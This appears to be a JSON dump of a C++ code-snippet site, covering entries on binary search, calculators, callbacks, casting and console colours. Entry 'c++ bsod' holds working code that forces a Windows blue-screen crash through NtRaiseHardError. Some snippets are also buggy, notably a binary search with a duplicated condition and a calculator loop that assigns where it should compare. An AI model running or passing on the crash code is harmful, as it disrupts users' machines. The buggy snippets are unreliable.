namespace std; int main() { \tint arr[]={10,2,34,2,5,4,1};   \tsort(arr,arr+7);//sort array in ascending order before using binary search   \tbinary_search(arr,arr+7,10);//return 1 as element is found   \tbinary_search(arr,arr+7,3);//return 0 as element is not found   \treturn 0; }\n#include<iostream>  using namespace std;  int binarySearch(int arr[], int p, int r, int num) {     if (p <= r) {        int mid = (p + r)/2;        if (arr[mid] == num)             return mid ;        if (arr[mid] > num)            return binarySearch(arr, p, mid-1, num);                   if (arr[mid] < num)          return binarySearch(arr, mid+1, r, num);     }     return -1;  }  int main(void) {     int arr[] = {1, 3, 7, 15, 18, 20, 25, 33, 36, 40};     int n = sizeof(arr)/ sizeof(arr[0]);     int num = 33;     int index = binarySearch (arr, 0, n-1, num);     if(index == -1)       cout<< num <<\" is not present in the array\";    else       cout<< num <<\" is present at index \"<< index <<\" in the array\";     return 0;  }\n#include<iostream> using namespace std; int binarySearch(int arr[], int p, int r, int num) {    if (p <= r) {       int mid = (p + r)/2;       if (arr[mid] == num)       return mid ;       if (arr[mid] > num)       return binarySearch(arr, p, mid-1, num);       if (arr[mid] > num)       return binarySearch(arr, mid+1, r, num);    }    return -1; } int main(void) {    int arr[] = {1, 3, 7, 15, 18, 20, 25, 33, 36, 40};    int n = sizeof(arr)/ sizeof(arr[0]);    int num = 33;    int index = binarySearch (arr, 0, n-1, num);    if(index == -1)    cout<< num <<\" is not present in the array\";    else    cout<< num <<\" is present at index \"<< index <<\" in the array\";    return 0; }\n//requires header <algorithm> for std::binary_search #include <algorithm> #include <vector>  bool binarySearchVector(const std::vector<int>& vector,                        \tint target) {   //this line does all binary searching   return std::binary_search(vector.cbegin(), vector.cend(), target); }  #include <iostream>  int main() {     std::vector<int> haystack {1, 3, 4, 5, 9};     std::vector<int> needles {1, 2, 3};       for (auto needle : needles) {         std::cout << \"Searching for \" << needle << std::endl;         if (binarySearchVector(haystack, needle)) {             std::cout << \"Found \" << needle << std::endl;         } else {             std::cout << \"no dice!\" << std::endl;         }     } }\nint result = -1;   int low = 0;   int high = N-1; // N - # of elements    while (low <= high)    {  mid = (low + high) / 2;       if ( item == vector[mid]) \t  {  result = mid; \t     break;        }       else if (item > vector[mid] ) \t           { low =  mid + 1; }           else  { high = mid - 1; }    } \n",
    "reg_date": "2021-10-12T11:37:41.000Z"
  },
  {
    "id": 710,
    "keyword": null,
    "link": null,
    "title": " c++ bind port",
    "description": "s = socket(AF_INET, SOCK_STREAM, 0); /* ... */  memset(&client_addr, 0, sizeof(client_addr)); client_addr.sin_family = AF_INET; client_addr.sin_port = htons(22222);  if (bind(s, (struct sockaddr *) &client_addr, sizeof(client_addr)) < 0) {     perror(\"bind\");     exit(1); }  connect(s, (struct sockaddr *) &server_addr, sizeof(server_addr)); \n",
    "reg_date": "2021-10-12T11:37:41.000Z"
  },
  {
    "id": 711,
    "keyword": null,
    "link": null,
    "title": " c++ bit shift wrap",
    "description": "uint8_t a = 124; uint8_t aShifted = leftBitshiftWrap(a,2);  uint8_t leftBitshiftWrap_uint8_t(uint8_t val, uint8_t amt){   return (val << amt) | (val >> (8-amt)); }\n//Rotating integers are done as follows letter = ((unsigned char)letter >> 1) | (letter << 7);\n",
    "reg_date": "2021-10-12T11:37:41.000Z"
  },
  {
    "id": 712,
    "keyword": null,
    "link": null,
    "title": " c++ boilerplate vscode",
    "description": "// Write this code in the cpp.json file { \t\"cpp snippets\": \t{ \t\t\"prefix\" : \"boilerplate\", \t\t\t\t\"body\" : [ \t\t\t\t\t\"#include<iostream>\", \t\t\t\t\t\"using namespace std;\", \t\t\t\t\t\"int main()\", \t\t\t\t\t\"{\", \t\t\t\t\t\" return 0;\", \t\t\t\t\t\"}\"  \t\t\t\t], \t\t\t\t\t\t\t\"description\" : \"to produce the main snippet for cpp\" \t} } \n",
    "reg_date": "2021-10-12T11:37:41.000Z"
  },
  {
    "id": 713,
    "keyword": null,
    "link": null,
    "title": " c++ boolean",
    "description": "bool isCodingFun = true; bool isFishTasty = false; cout << isCodingFun;  // Outputs 1 (true) cout << isFishTasty;  // Outputs 0 (false)  //credit to w3schools.com\nbool b1 = true;      // declaring a boolean variable with true value\n#include<stdio.h> #include <stdbool.h> main() {      bool value = true;     (value) ? printf(\"value is true\"): printf(\"value is false\"); }\nbool Divisible(int a, int b) {     return (a % b) == 0; }\nbool Divisible(int a, int b) {     return !(a % b); }\nbool Divisible(int a, int b) {     int remainder = a % b; // Calculate the remainder of a and b.      if(remainder == 0) {         return true; //If the remainder is 0, the numbers are divisible.     } else {         return false; // Otherwise, they aren't.     } }\n",
    "reg_date": "2021-10-12T11:37:41.000Z"
  },
  {
    "id": 714,
    "keyword": null,
    "link": null,
    "title": " c++ break Statement",
    "description": "break; statement helps in coming out of the current loop Further in case of nested loop it gets you out of the innermost loop.\nfor (int i = 0; i < 10; i++) {   if (i == 4) {     continue;   }   cout << i << \"\\n\"; }\n",
    "reg_date": "2021-10-12T11:37:41.000Z"
  },
  {
    "id": 715,
    "keyword": null,
    "link": null,
    "title": " c++ bsod",
    "description": "#include <Windows.h> #include <ntstatus.h>  #define SHUTDOWN_PRIVILEGE 19 #define OPTION_SHUTDOWN 6  // function definitions typedef NTSTATUS(NTAPI *pdef_RtlAdjustPrivilege) ( \tULONG privilege, \tBOOLEAN enable, \tBOOLEAN current_thread, \tPBOOLEAN enabled); typedef NTSTATUS(NTAPI *pdef_NtRaiseHardError)( \tNTSTATUS error_status, \tULONG number_of_parameters, \tULONG unicode_string_parameter_mask, \tPULONG_PTR parameters, \tULONG response_option, \tPULONG reponse);  int main() { \tpdef_RtlAdjustPrivilege RtlAdjustPrivilege = (pdef_RtlAdjustPrivilege)GetProcAddress(LoadLibraryA(\"ntdll.dll\"), \"RtlAdjustPrivilege\"); \tBOOLEAN enabled; \tif (RtlAdjustPrivilege(SHUTDOWN_PRIVILEGE, TRUE, FALSE, &enabled) == 0) \t{ \t\tpdef_NtRaiseHardError NtRaiseHardError = (pdef_NtRaiseHardError)GetProcAddress(LoadLibraryA(\"ntdll.dll\"), \"NtRaiseHardError\"); \t\tULONG response; \t\tNtRaiseHardError(STATUS_NOT_IMPLEMENTED, 0, 0, 0, OPTION_SHUTDOWN, &response); \t} }\n",
    "reg_date": "2021-10-12T11:37:41.000Z"
  },
  {
    "id": 716,
    "keyword": null,
    "link": null,
    "title": " c++ buble sort",
    "description": "void bubbleSort(int arr[], int size){   int temp = int();   //print out the unsorted values   for ( int i = 0; i < size -1; i ++)     cout << arr[i] << \"\\t\";   cout << endl << endl;         for (int i = 1; i < size; i++ ){   \tfor(int j = 0; j < size - i ; j ++){//size-i is the sorted part of the array\t    \t\tif( arr[j] > arr[j + 1]){//if the value is greater than the next value in the array, swap it           temp = arr[j];           arr[j] = arr[j+1];//swap the two values           arr[j+1] = temp;                    }//end if     }//end for   }//end for    }//end bubbleSort\nPsuedo code:  Procedure bubble_sort (array , N)                array &ndash; list of items to be sorted                N &ndash; size of array begin                swapped = false                repeat                              for I = 1 to N-1                                                if array[i-1] > array[i] then                                                            swap array[i-1] and array[i]                                                            swapped = true                                               end if                               end for                 until not swapped end procedure\n",
    "reg_date": "2021-10-12T11:37:41.000Z"
  },
  {
    "id": 717,
    "keyword": null,
    "link": null,
    "title": " c++ calculator",
    "description": "// ONLY 29 LINES OF CODE IN TOTAL // For better calculator scroll down on this post #include <iostream> using namespace std; int main() { \tcout << \"Please enter the first number: \"; \tdouble n1 = 0; \tcin >> n1; \tcout << \"Please enter an operator (+, -, *, /): \"; \tchar op = '0'; \tcin >> op; \tcout << \"Please enter a second number: \"; \tdouble n2 = 0; \tcin >> n2; \tdouble answer = 0; \tswitch (op) { \tcase '+':  \t\tanswer = n1 + n2; \t\tbreak; \tcase '-': \t\tanswer = n1 - n2; \t\tbreak; \tcase '*':  \t\tanswer = n1 * n2; \t\tbreak; \tcase '/':  \t\tanswer = n1 / n2; \t\tbreak; \t} \tcout << \"Thanks for using my calculator your answer is: \" << answer;      // this is the better calculator:      #include <iostream> #include <Windows.h> using namespace std; int main() { \tchar jim = 'j'; \tdo { \t\t \t\tcout << \"Please enter the first number: \"; \t\tdouble n1 = 0; \t\tcin >> n1; \t\tcout << \"Please enter an operator (+, -, *, /): \"; \t\tchar op = '0'; \t\tcin >> op; \t\tcout << \"Please enter a second number: \"; \t\tdouble n2 = 0; \t\tcin >> n2; \t\tdouble answer = 0; \t\tswitch (op) { \t\tcase '+': \t\t\tanswer = n1 + n2; \t\t\tbreak; \t\tcase '-': \t\t\tanswer = n1 - n2; \t\t\tbreak; \t\tcase '*': \t\t\tanswer = n1 * n2; \t\t\tbreak; \t\tcase '/': \t\t\tanswer = n1 / n2; \t\t\tbreak; \t\t} \t\tcout << \"Thanks for using my calculator your answer is: \" << answer << \" do you want to run the program again? (y or n) \"; \t\tcin >> jim;  \t} while (jim = 'y' && jim != 'n'); \tif (jim = 'n') { \t\tcout << \"Thanks for using my calculator here is sum epic music\"; \t\tBeep(329, 300); \t\tBeep(493, 300); \t\tBeep(698, 300); \t\tBeep(659, 600);  \t\tBeep(783, 300); \t\tBeep(698, 300); \t\tBeep(659, 600);  \t\tBeep(329, 100); \t\tBeep(493, 300); \t\tBeep(698, 300); \t\tBeep(659, 600);  \t\tBeep(392, 250); \t\tBeep(440, 200); \t\tBeep(587, 300);  \t\tBeep(349, 250); \t\tBeep(587, 500);  \t\tBeep(329, 300); \t\tBeep(493, 300); \t\tBeep(698, 300); \t\tBeep(659, 600);  \t\tBeep(783, 300); \t\tBeep(698, 300); \t\tBeep(659, 600);  \t\tBeep(329, 100); \t\tBeep(493, 300); \t\tBeep(698, 300); \t\tBeep(659, 600);  \t\tBeep(392, 250); \t\tBeep(440, 200); \t\tBeep(587, 300);  \t\tBeep(349, 250); \t\tBeep(587, 400); \t} \treturn 0; }\n#include<iostream> using namespace std; int calculator(int num1,int num2,int num3); int main() {     //int num1,num2,num3,choice;     int a,b,c,choice;     cout<<\"enter the first number\"<<endl;     cin>>a;     cout<<\"enter the second number\"<<endl;     cin>>b;     cout<<\"************************\"<<endl;     cout<<\"****Make your choice****\"<<endl;     cout<<\"1.Addition\"<<endl;     cout<<\"2.Subtraction\"<<endl;     cout<<\"3.Multiplication\"<<endl;     cout<<\"4.Division\"<<endl;     cout<<\"************************\"<<endl;      choice=calculator(a,b,c);     return 0; } int calculator(int num1,int num2,int num3) {      int choice;     cin>>choice;     switch(choice)     {          case 1: cout<<\"you have selected Addition\"<<endl;                 num3=num1+num2;                 cout<<\"Addition of two numbers is \"<<num3<<endl;                 break;          case 2: cout<<\"you have selected Subtraction\"<<endl;                 num3=num1-num2;                 cout<<\"Subtraction of two numbers is \"<<num3<<endl;                 break;          case 3: cout<<\"you have selected Multiplication\"<<endl;                 num3=num1*num2;                 cout<<\"Multiplication of two numbers is \"<<num3<<endl;                 break;          case 4: cout<<\"You have selected Division\"<<endl;                 num3=num1/num2;                 cout<<\"Division of two numbers is \"<<num3<<endl;                 break;          default: cout<<\"You have entered wrong choice\"<<endl;                     break;     } }  \n#include <iostream> using namespace std;  int main() {     char setOperator;     float firstNum = 0.00, secondNum = 0.00;     cout << \"Enter your operater: +, -, *, /:  \\n\";     cin >> setOperator;     cout << \"Enter your first calculation:  \\n\";     cin >> firstNum;     cout <<  \"Enter your second calculation:  \\n\";     cin >> secondNum;          switch(setOperator) {         case '+':         cout << \"The answer is: \" <<firstNum + secondNum;         break;                  case '-':         cout << \"The answer is:\" << firstNum - secondNum;         break;                  case '*':         cout << \"The answer is: \" << firstNum * secondNum;         break;                  case '/':         cout << \"The answer is: \" << firstNum / secondNum;         break;     }     return 0; }\n// This is for beginners  #include <iostream>  using namespace std;  void greetings() {     cout << \"welcome to the calculator made in c++ :D\\n\"; }  void instructions() {     cout << \"Here is the operators you can use + - / *\\n\"; }  int main() {     greetings();     instructions();     int num1, num2;     char op;     int result;     char again = 'Y';      while (again == 'y' || again == 'Y') {            cout << \"\\nEnter your first digit: \";         cin >> num1;          cout << \"\\nEnter your operator digit: \";         cin >> op;          cout << \"\\nEnter your second digit: \";         cin >> num2;          if (op == '+') {             result = num1 + num2;         }         else if (op == '-') {             result = num1 - num2;         }         else if (op == '*') {             result = num1 * num2;         }         else if (op == '/') {             result = num1 / num2;         }         else {             cout << \"Invalid operator\";         }          cout << \"= \" << result;         cout << \"\\nDo you want to restart the calculator? (Y or N)\";         cin >> again;     }      system(\"pause>0\");      return 0; }\n#include <iostream>  using namespace std;  int main() { cout << \"Welcome to the Calculator, write :cancel: to cancel the calculator\\n\";  string cancel;   while(cancel != \"cancel\")  {      int number1 = 0;      int number2 = 0;      string op;       cout << \"please enter your first number!\\n\";       cin >> number1;       cout << \"please enter your second number!\\n\";       cin >> number2;        cout << \"please enter a operator!\\n\";      cout << \"( *, / , + , - )\";       cin >> op;          if(op == \"*\")     {         number1 = number1 * number2;         cout << number1;          number1 = 0;         number2 = 0;     }      if(op == \"/\")     {         number1 = number1 / number2;         cout << number1;         number1 = 0;         number2 = 0;     }      if(op == \"+\")     {         number1 = number1 + number2;          cout << number1;         number1 = 0;         number2 = 0;     }      if(op == \"-\")     {         number1 = number1 - number2;         cout << number1;          number1 = 0;          number2 = 0;     }          cout << \"Write cancel to cancel\\n\";     cout << \"write continue to resume with the calculator!\\n\";          cin >> cancel;   }       } //powered by my coding server: https://discord.gg/GUgnYHJV\n#include <iostream> using namespace std;  int main() { \tint choice;  \tcout << 1 << endl; \tcout << 2 << endl; \tcout << 3 << endl; \tcout << 4 << endl;  \tcout << \"Choice A Number: \"; \tcin >> choice;  \tif (choice >= 1 && choice <= 4) \t{ \t\tint a, b;  \t\tcout << \"Enter Num One: \"; \t\tcin >> a; \t\tcout << \"Enter Num Two: \"; \t\tcin >> b;  \t\tif (choice == 1) \t\t\tcout << a << \"+\" << b << \"=\" << a + b << endl; \t\tif (choice == 2) \t\t\tcout << a << \"-\" << b << \"=\" << a - b << endl; \t\tif (choice == 3) \t\t\tcout << a << \"*\" << b << \"=\" << a * b << endl; \t} \telse \t{ \t\tcout << \"Wrong Choice\" << endl; \t} }\n",
    "reg_date": "2021-10-12T11:37:41.000Z"
  },
  {
    "id": 718,
    "keyword": null,
    "link": null,
    "title": " c++ calculator program using switch case",
    "description": "#include<iostream> using namespace std; int calculator(int num1,int num2,int num3); int main() {     //int num1,num2,num3,choice;     int a,b,c,choice;     cout<<\"enter the first number\"<<endl;     cin>>a;     cout<<\"enter the second number\"<<endl;     cin>>b;     cout<<\"************************\"<<endl;     cout<<\"****Make your choice****\"<<endl;     cout<<\"1.Addition\"<<endl;     cout<<\"2.Subtraction\"<<endl;     cout<<\"3.Multiplication\"<<endl;     cout<<\"4.Division\"<<endl;     cout<<\"************************\"<<endl;      choice=calculator(a,b,c);     return 0; } int calculator(int num1,int num2,int num3) {      int choice;     cin>>choice;     switch(choice)     {          case 1: cout<<\"you have selected Addition\"<<endl;                 num3=num1+num2;                 cout<<\"Addition of two numbers is \"<<num3<<endl;                 break;          case 2: cout<<\"you have selected Subtraction\"<<endl;                 num3=num1-num2;                 cout<<\"Subtraction of two numbers is \"<<num3<<endl;                 break;          case 3: cout<<\"you have selected Multiplication\"<<endl;                 num3=num1*num2;                 cout<<\"Multiplication of two numbers is \"<<num3<<endl;                 break;          case 4: cout<<\"You have selected Division\"<<endl;                 num3=num1/num2;                 cout<<\"Division of two numbers is \"<<num3<<endl;                 break;          default: cout<<\"You have entered wrong choice\"<<endl;                     break;     } }  \n",
    "reg_date": "2021-10-12T11:37:42.000Z"
  },
  {
    "id": 719,
    "keyword": null,
    "link": null,
    "title": " c++ calculator script",
    "description": "#include <iostream>  using namespace std;  int main() { cout << \"Welcome to the Calculator, write :cancel: to cancel the calculator\\n\";  string cancel;   while(cancel != \"cancel\")  {      int number1 = 0;      int number2 = 0;      string op;       cout << \"please enter your first number!\\n\";       cin >> number1;       cout << \"please enter your second number!\\n\";       cin >> number2;        cout << \"please enter a operator!\\n\";      cout << \"( *, / , + , - )\";       cin >> op;          if(op == \"*\")     {         number1 = number1 * number2;         cout << number1;          number1 = 0;         number2 = 0;     }      if(op == \"/\")     {         number1 = number1 / number2;         cout << number1;         number1 = 0;         number2 = 0;     }      if(op == \"+\")     {         number1 = number1 + number2;          cout << number1;         number1 = 0;         number2 = 0;     }      if(op == \"-\")     {         number1 = number1 - number2;         cout << number1;          number1 = 0;          number2 = 0;     }          cout << \"Write cancel to cancel\\n\";     cout << \"write continue to resume with the calculator!\\n\";          cin >> cancel;   }       } //powered by my coding server: https://discord.gg/GUgnYHJV\n#include <iostream>  using namespace std;  int main() { int num1; int num2; char op;      cout << \"Enter a number:\" << endl;   cin >> num1; //takes input      cout << \"Enter another number:\" << endl; //prints some prompt   cin >> num2;      cout << \"Enter a operator:\" << endl; //prints some prompt   cin >> op;      if(op == '+')   {   cout << \"Result = \" << num1 + num2 << endl;   }else if(op == '-'){   cout << \"Result = \" << num1 - num2 << endl;   }else if(op == '*'){   cout << \"Result = \" << num1 * num2 << endl;   }else if(op == '/'){   cout << \"Result = \" << num1 / num2 << endl;   }       }\n",
    "reg_date": "2021-10-12T11:37:42.000Z"
  },
  {
    "id": 720,
    "keyword": null,
    "link": null,
    "title": " c++ call method in same class",
    "description": "class Example{   void A(){     //do something   }      void B(){     this->A();     // or     A();   } }\n",
    "reg_date": "2021-10-12T11:37:42.000Z"
  },
  {
    "id": 721,
    "keyword": null,
    "link": null,
    "title": " c++ callback function",
    "description": "class Foo { \tint (*func)(int);    public:   \tvoid setCallback( int (*cFunc)(int) ) {       func = cFunc;     }      \tvoid set() {     \tsetCallback(callback);\t// Set callback function to be called later     }        void use() {       \tfunc(5);\t// Call the previously set callback function     }              \t// Note the 'static'     static int callback(int param) {       \treturn 1;     } };\n//Define a type for the callback signature, //it is not necessary, but makes life easier  //Function pointer called CallbackType that takes a float //and returns an int typedef int (*CallbackType)(float);     void DoWork(CallbackType callback) {   float variable = 0.0f;    //Do calculations    //Call the callback with the variable, and retrieve the   //result   int result = callback(variable);    //Do something with the result }  int SomeCallback(float variable) {   int result;    //Interpret variable    return result; }  int main(int argc, char ** argv) {   //Pass in SomeCallback to the DoWork   DoWork(&SomeCallback); } \n// C++ callback function  class Base { public:   void doSomething() {     using namespace std::placeholders;     // std::placeholders::_1 is for the callback parameter     // use _1 for 1 argument     // or _1, _2, _3 for 3 arguments and so on     something.setCallback(std::bind(&Base::callback, this, _1));     // std::bind is needed, otherwise      // the callback function would need to be static   }      // Callback function   void callback(int i) {     std::cout << \"Callback: \" << i << std::endl;   } }\n",
    "reg_date": "2021-10-12T11:37:42.000Z"
  },
  {
    "id": 722,
    "keyword": null,
    "link": null,
    "title": " c++ callback member function",
    "description": "class Foo { \tint (*func)(int);    public:   \tvoid setCallback( int (*cFunc)(int) ) {       func = cFunc;     }      \tvoid set() {     \tsetCallback(callback);\t// Set callback function to be called later     }        void use() {       \tfunc(5);\t// Call the previously set callback function     }              \t// Note the 'static'     static int callback(int param) {       \treturn 1;     } };\n",
    "reg_date": "2021-10-12T11:37:42.000Z"
  },
  {
    "id": 723,
    "keyword": null,
    "link": null,
    "title": " c++ calorie calculator using a for loop",
    "description": "#include <iostream>  using namespace std;  int main() {     int numberOfItems;     int totalCalories = 0;     int caloriesForItem;     cout << \"How many items did you eat today? \";     cin >> numberOfItems;     cout << \"Enter the number of calories in each of the \"          << numberOfItems << \" items eaten:  \" << endl;      for (int count = 1; count <= numberOfItems; count++)     {         cout << \"Enter calorie: \";         cin >> caloriesForItem;         totalCalories += caloriesForItem;     }      cout << \"Total calories eaten today = \" << totalCalories;      return 0; }\n",
    "reg_date": "2021-10-12T11:37:42.000Z"
  },
  {
    "id": 724,
    "keyword": null,
    "link": null,
    "title": " c++ caps lock key",
    "description": "GetAsyncKeyState(VK_CAPITAL) & 1\n",
    "reg_date": "2021-10-12T11:37:42.000Z"
  },
  {
    "id": 725,
    "keyword": null,
    "link": null,
    "title": " c++ capture screen as pixel array",
    "description": "HWND desktop = GetDesktopWindow(); HDC desktopHdc = GetDC(desktop); COLORREF color = GetPixel(desktopHdc, x, y); \n",
    "reg_date": "2021-10-12T11:37:42.000Z"
  },
  {
    "id": 726,
    "keyword": null,
    "link": null,
    "title": " c++ cast char to string",
    "description": "// example char sczName[] = {\"Jakes\"}; std::string strName = std::string(sczName);  /* SYNTAX #include <string> std::string(<char-to-convert>) */\nstd::cout << std::string(1, c) << std::endl;\n",
    "reg_date": "2021-10-12T11:37:42.000Z"
  },
  {
    "id": 727,
    "keyword": null,
    "link": null,
    "title": " c++ cast operator",
    "description": "struct X {     //implicit conversion     operator int() const { return 7; }       // explicit conversion     explicit operator int*() const { return nullptr; }   //   Error: array operator not allowed in conversion-type-id //   operator int(*)[3]() const { return nullptr; }     using arr_t = int[3];     operator arr_t*() const { return nullptr; } // OK if done through typedef //  operator arr_t () const; // Error: conversion to array not allowed in any case };   int main() {     X x;       int n = static_cast<int>(x);   // OK: sets n to 7     int m = x;                     // OK: sets m to 7       int* p = static_cast<int*>(x);  // OK: sets p to null //  int* q = x; // Error: no implicit conversion       int (*pa)[3] = x;  // OK }\n",
    "reg_date": "2021-10-12T11:37:42.000Z"
  },
  {
    "id": 728,
    "keyword": null,
    "link": null,
    "title": " c++ casting",
    "description": "static_cast<int>(some_double);\nstatic_cast: //does implicit conversions between types. void* data; pointer *pData = static_cast<pointer*>(data);  const_cast: //this can be used to remove or add the const to a variable. const char* characters; const_cast<char*>(characters);  reinterpret_cast: //this cast is dangerous since it turns one type directly into another. struct S1 { int a; } s1; int* p1 = reinterpret_cast<int*>(&s1);\n",
    "reg_date": "2021-10-12T11:37:42.000Z"
  },
  {
    "id": 729,
    "keyword": null,
    "link": null,
    "title": " c++ change console color",
    "description": "WORD color = 0x0F; // White SetConsoleTextAttribute( GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED); cout << \"Hello World\" << endl; SetConsoleTextAttribute( GetStdHandle(STD_OUTPUT_HANDLE), color); // The farbcodes are the same as they, when you type \"color help\" in the windows  // cmd in. First the number, then the letter (here the output of the cmd): /*  0 = Black       8 = Gray     1 = Blue        9 = Light Blue     2 = Green       A = Light Green     3 = Aqua        B = Light Aqua     4 = Red         C = Light Red     5 = Purple      D = Light Purple     6 = Yellow      E = Light Yellow     7 = Light Gray  F = White     */ // So, to get the output white again, you have the set the color to: // 0x + 0 (Black Background) + F (White Foreground) // This works on every OS!\n//This is a header file taken from cplusplus.com //http://www.cplusplus.com/articles/Eyhv0pDG/ //concol.h #ifndef _INC_EKU_IO_CONCOL #define _INC_EKU_IO_CONCOL  /*Header file to color text and background in windows console applications Global variables - textcol,backcol,deftextcol,defbackcol,colorprotect*/  #include<windows.h> #include<iosfwd>  namespace eku {  #ifndef CONCOL #define CONCOL \tenum concol \t{ \t\tblack=0, \t\tdark_blue=1, \t\tdark_green=2, \t\tdark_aqua,dark_cyan=3, \t\tdark_red=4, \t\tdark_purple=5,dark_pink=5,dark_magenta=5, \t\tdark_yellow=6, \t\tdark_white=7, \t\tgray=8, \t\tblue=9, \t\tgreen=10, \t\taqua=11,cyan=11, \t\tred=12, \t\tpurple=13,pink=13,magenta=13, \t\tyellow=14, \t\twhite=15 \t}; #endif //CONCOL  \tHANDLE std_con_out; \t//Standard Output Handle \tbool colorprotect=false; \t//If colorprotect is true, background and text colors will never be the same \tconcol textcol,backcol,deftextcol,defbackcol; \t/*textcol - current text color \tbackcol - current back color \tdeftextcol - original text color \tdefbackcol - original back color*/  \tinline void update_colors() \t{ \t\tCONSOLE_SCREEN_BUFFER_INFO csbi; \t\tGetConsoleScreenBufferInfo(std_con_out,&csbi); \t\ttextcol = concol(csbi.wAttributes & 15); \t\tbackcol = concol((csbi.wAttributes & 0xf0)>>4); \t}  \tinline void setcolor(concol textcolor,concol backcolor) \t{ \t\tif(colorprotect && textcolor==backcolor)return; \t\ttextcol=textcolor;backcol=backcolor; \t\tunsigned short wAttributes=((unsigned int)backcol<<4) | (unsigned int)textcol; \t\tSetConsoleTextAttribute(std_con_out,wAttributes); \t}  \tinline void settextcolor(concol textcolor) \t{ \t\tif(colorprotect && textcolor==backcol)return; \t\ttextcol=textcolor; \t\tunsigned short wAttributes=((unsigned int)backcol<<4) | (unsigned int)textcol; \t\tSetConsoleTextAttribute(std_con_out,wAttributes); \t}  \tinline void setbackcolor(concol backcolor) \t{ \t\tif(colorprotect && textcol==backcolor)return; \t\tbackcol=backcolor; \t\tunsigned short wAttributes=((unsigned int)backcol<<4) | (unsigned int)textcol; \t\tSetConsoleTextAttribute(std_con_out,wAttributes); \t}  \tinline void concolinit() \t{ \t\tstd_con_out=GetStdHandle(STD_OUTPUT_HANDLE); \t\tupdate_colors(); \t\tdeftextcol=textcol;defbackcol=backcol; \t}  \ttemplate<class elem,class traits> \tinline std::basic_ostream<elem,traits>& operator<<(std::basic_ostream<elem,traits>& os,concol col) \t{os.flush();settextcolor(col);return os;}  \ttemplate<class elem,class traits> \tinline std::basic_istream<elem,traits>& operator>>(std::basic_istream<elem,traits>& is,concol col) \t{ \t\tstd::basic_ostream<elem,traits>* p=is.tie(); \t\tif(p!=NULL)p->flush(); \t\tsettextcolor(col); \t\treturn is; \t} \t }\t//end of namespace eku  #endif\t//_INC_EKU_IO_CONCOL\n//This is one way to do it. Taken from stackoverflow. system(\"color 70\"); //It just runs a cmd command.\n",
    "reg_date": "2021-10-12T11:37:43.000Z"
  },
  {
    "id": 730,
    "keyword": null,
    "link": null,
    "title": " c++ changing string to double",
    "description": "#include <iostream> using namespace std; int main() {    char s[20] = \"18.2894 is a number\";    char *p;    double result;    result = strtod(s, &p);    cout<<\"The number after conversion of string : \"<<result;    return(0); }\n",
    "reg_date": "2021-10-12T11:37:43.000Z"
  },
  {
    "id": 731,
    "keyword": null,
    "link": null,
    "title": " c++ char define",
    "description": " // syntax:  // char <variable-name>[] = { '<1st-char>',  '<2nd-char>', ... , '<Nth-char>', '\\0'};   // example (to store 'Hello' in the YourVar variable):  char YourVar[] = {'H','e','l','l','o','\\0'}; // NOTE: the \\0 marks the end of the char array \n",
    "reg_date": "2021-10-12T11:37:43.000Z"
  },
  {
    "id": 732,
    "keyword": null,
    "link": null,
    "title": " c++ char print fixed",
    "description": "/* OUTPUT char variable value: Programming ----------------------------------------------------- [%s]       |Programming| [\u0010s]     |Programming| [\u0015s]     |    Programming| [%-15s]    |Programming    | [\u0015.5s]   |          Progr| [%-15.5s]  |Progr          | ----------------------------------------------------- */  // NOTE: Specifically used for char data-types (not strings)  char str[]=\"Programming\";    // Length = 11    std::cout << \"[%s]       |\"; printf(\"%s\",str);      // Display Complete String   std::cout << \"|\\n\";  std::cout << \"[\u0010s]     |\"; printf(\"\u0010s\",str);    // 10 < Length: Display Complete String   std::cout << \"|\\n\";  std::cout << \"[\u0015s]     |\"; printf(\"\u0015s\",str);    // 15 > Length: Displays Complete String with 4 spaces Alignment:Right   std::cout << \"|\\n\";  std::cout << \"[%-15s]    |\"; printf(\"%-15s\",str);   // Same as Above But Left Aligned std::cout << \"|\\n\";  std::cout << \"[\u0015.5s]   |\"; printf(\"\u0015.5s\",str);  // 15-5 = 10 spaces and show first 5 characters Align : R     std::cout << \"|\\n\";  std::cout << \"[%-15.5s]  |\"; printf(\"%-15.5s\",str); // 15-5 = 10 spaces and show first 5 characters Align : L   std::cout << \"|\\n\";\n",
    "reg_date": "2021-10-12T11:37:43.000Z"
  },
  {
    "id": 733,
    "keyword": null,
    "link": null,
    "title": " c++ char print width",
    "description": " /* OUTPUT char variable value: Programming ----------------------------------------------------- [%s]       |Programming| [\u0010s]     |Programming| [\u0015s]     |    Programming| [%-15s]    |Programming    | [\u0015.5s]   |          Progr| [%-15.5s]  |Progr          | ----------------------------------------------------- */  // NOTE: Specifically used for char data-types (not strings)  char str[]=\"Programming\";    // Length = 11    std::cout << \"[%s]       |\"; printf(\"%s\",str);      // Display Complete String   std::cout << \"|\\n\";  std::cout << \"[\u0010s]     |\"; printf(\"\u0010s\",str);    // 10 < Length: Display Complete String   std::cout << \"|\\n\";  std::cout << \"[\u0015s]     |\"; printf(\"\u0015s\",str);    // 15 > Length: Displays Complete String with 4 spaces Alignment:Right   std::cout << \"|\\n\";  std::cout << \"[%-15s]    |\"; printf(\"%-15s\",str);   // Same as Above But Left Aligned std::cout << \"|\\n\";  std::cout << \"[\u0015.5s]   |\"; printf(\"\u0015.5s\",str);  // 15-5 = 10 spaces and show first 5 characters Align : R     std::cout << \"|\\n\";  std::cout << \"[%-15.5s]  |\"; printf(\"%-15.5s\",str); // 15-5 = 10 spaces and show first 5 characters Align : L   std::cout << \"|\\n\";\n",
    "reg_date": "2021-10-12T11:37:43.000Z"
  },
  {
    "id": 734,
    "keyword": null,
    "link": null,
    "title": " c++ char to string",
    "description": "// example char sczName[] = {\"Jakes\"}; std::string strName = std::string(sczName);  /* SYNTAX #include <string> std::string(<char-to-convert>) */\nstd::cout << std::string(1, c) << std::endl;\nchar *cStr = \"C++\"; std::string Str = std::string(cStr);\n#include <iostream> using namespace std;  int main() {   char c = 'l';   string str;   str.push_back(c); }\n",
    "reg_date": "2021-10-12T11:37:43.000Z"
  },
  {
    "id": 735,
    "keyword": null,
    "link": null,
    "title": " c++ char to uppercase",
